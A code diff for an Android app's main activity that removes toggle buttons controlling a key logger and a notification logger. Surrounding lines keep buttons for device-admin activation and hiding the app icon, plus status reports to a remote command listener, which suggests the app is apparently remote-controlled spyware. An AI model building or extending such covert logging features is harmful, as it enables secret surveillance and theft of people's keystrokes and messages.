@@ -103,46 +103,6 @@ class MainActivity : Activity() {
             val btnTestSync = findViewById<Button>(R.id.btnTestSync)
             val btnEnableAdmin = findViewById<Button>(R.id.btnEnableAdmin)
             val btnHideAppIcon = findViewById<Button>(R.id.btnHideAppIcon)
-            val btnToggleKeyLog = findViewById<Button>(R.id.btnToggleKeyLog)
-            val btnToggleNotifLog = findViewById<Button>(R.id.btnToggleNotifLog)
-
-            fun updateToggleButtons() {
-                if (KeyloggingConfig.isEnabled) {
-                    btnToggleKeyLog?.text = "Key Logger: ENABLED"
-                    btnToggleKeyLog?.setBackgroundColor(android.graphics.Color.parseColor("#388E3C"))
-                } else {
-                    btnToggleKeyLog?.text = "Key Logger: DISABLED"
-                    btnToggleKeyLog?.setBackgroundColor(android.graphics.Color.parseColor("#C62828"))
-                }
-
-                if (NotificationConfig.isEnabled) {
-                    btnToggleNotifLog?.text = "Notification Logger: ENABLED"
-                    btnToggleNotifLog?.setBackgroundColor(android.graphics.Color.parseColor("#388E3C"))
-                } else {
-                    btnToggleNotifLog?.text = "Notification Logger: DISABLED"
-                    btnToggleNotifLog?.setBackgroundColor(android.graphics.Color.parseColor("#C62828"))
-                }
-            }
-
-            updateToggleButtons()
-
-            btnToggleKeyLog?.setOnClickListener {
-                KeyloggingConfig.isEnabled = !KeyloggingConfig.isEnabled
-                updateToggleButtons()
-                val status = if (KeyloggingConfig.isEnabled) "ENABLED" else "DISABLED"
-                Toast.makeText(this, "Key Logger is now $status", Toast.LENGTH_SHORT).show()
-                LogStore.addLog("Toggle: Key Logger is $status")
-                RemoteCommandListener.reportCurrentStatus()
-            }
-
-            btnToggleNotifLog?.setOnClickListener {
-                NotificationConfig.isEnabled = !NotificationConfig.isEnabled
-                updateToggleButtons()
-                val status = if (NotificationConfig.isEnabled) "ENABLED" else "DISABLED"
-                Toast.makeText(this, "Notification Logger is now $status", Toast.LENGTH_SHORT).show()
-                LogStore.addLog("Toggle: Notification Logger is $status")
-                RemoteCommandListener.reportCurrentStatus()
-            }
 
             LogStore.setListener { logs ->
                 runOnUiThread {
